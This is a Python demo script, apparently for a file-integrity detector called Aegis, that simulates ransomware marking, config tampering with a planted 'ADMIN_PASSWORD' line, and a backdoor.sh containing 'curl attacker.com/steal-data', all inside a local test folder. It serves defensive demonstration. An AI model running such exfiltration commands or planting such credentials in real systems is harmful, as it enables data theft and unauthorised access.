#!/usr/bin/env python3
"""
Aegis Attack Simulator - Demonstrates breach detection
Simulates various attack scenarios for faculty demo
"""

import os
import time
import random
from rich.console import Console
from rich.panel import Panel
from rich import box

console = Console()


def simulate_ransomware_attack(target_dir: str):
    """Simulate ransomware modifying files"""
    console.print("\n[bold red]🚨 SIMULATING RANSOMWARE ATTACK 🚨[/bold red]\n")
    
    files = [f for f in os.listdir(target_dir) if os.path.isfile(os.path.join(target_dir, f))]
    
    if not files:
        console.print("[yellow]No files to attack[/yellow]")
        return
    
    target_file = os.path.join(target_dir, random.choice(files))
    
    with console.status(f"[red]Encrypting {os.path.basename(target_file)}...", spinner="dots"):
        time.sleep(2)
        with open(target_file, 'a') as f:
            f.write("\n[ENCRYPTED_BY_RANSOMWARE]")
    
    console.print(f"[bold red]✗[/bold red] File modified: [yellow]{target_file}[/yellow]")
    console.print("[dim]Run integrity check to detect this breach[/dim]\n")


def simulate_backdoor_injection(target_dir: str):
    """Simulate backdoor file injection"""
    console.print("\n[bold red]🚨 SIMULATING BACKDOOR INJECTION 🚨[/bold red]\n")
    
    backdoor_file = os.path.join(target_dir, "backdoor.sh")
    
    with console.status("[red]Injecting malicious script...", spinner="dots"):
        time.sleep(2)
        with open(backdoor_file, 'w') as f:
            f.write("#!/bin/bash\n")
            f.write("# Malicious backdoor\n")
            f.write("curl attacker.com/steal-data\n")
    
    console.print(f"[bold red]✗[/bold red] Backdoor created: [yellow]{backdoor_file}[/yellow]")
    console.print("[dim]Run integrity check to detect this breach[/dim]\n")


def simulate_config_tampering(target_dir: str):
    """Simulate configuration file tampering"""
    console.print("\n[bold red]🚨 SIMULATING CONFIG TAMPERING 🚨[/bold red]\n")
    
    config_files = [f for f in os.listdir(target_dir) if f.endswith(('.conf', '.cfg', '.yml', '.env'))]
    
    if not config_files:
        console.print("[yellow]No config files found[/yellow]")
        return
    
    target = os.path.join(target_dir, random.choice(config_files))
    
    with console.status(f"[red]Tampering with {os.path.basename(target)}...", spinner="dots"):
        time.sleep(2)
        with open(target, 'a') as f:
            f.write("\n# Backdoor credentials\nADMIN_PASSWORD=hacked123\n")
    
    console.print(f"[bold red]✗[/bold red] Config modified: [yellow]{target}[/yellow]")
    console.print("[dim]Run integrity check to detect this breach[/dim]\n")


def run_attack_demo():
    """Run full attack demonstration"""
    
    banner = Panel(
        "[bold red]AEGIS ATTACK SIMULATOR[/bold red]\n\n"
        "[yellow]⚠ FOR DEMONSTRATION PURPOSES ONLY ⚠[/yellow]\n\n"
        "Simulates real-world attacks to demonstrate\n"
        "Aegis detection capabilities",
        box=box.DOUBLE,
        border_style="red"
    )
    
    console.print(banner)
    console.print()
    
    attacks = [
        ("Ransomware Encryption", simulate_ransomware_attack),
        ("Backdoor Injection", simulate_backdoor_injection),
        ("Config Tampering", simulate_config_tampering)
    ]
    
    console.print("[bold cyan]Select attack scenario:[/bold cyan]\n")
    for i, (name, _) in enumerate(attacks, 1):
        console.print(f"  {i}. {name}")
    console.print(f"  {len(attacks)+1}. Run all attacks")
    console.print()
    
    try:
        choice = input("Enter choice: ")
        choice = int(choice)
        
        target_dir = "./test_data"
        
        if choice == len(attacks) + 1:
            for name, attack_func in attacks:
                attack_func(target_dir)
                time.sleep(1)
        elif 1 <= choice <= len(attacks):
            attacks[choice-1][1](target_dir)
        else:
            console.print("[red]Invalid choice[/red]")
            
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")


if __name__ == "__main__":
    run_attack_demo()
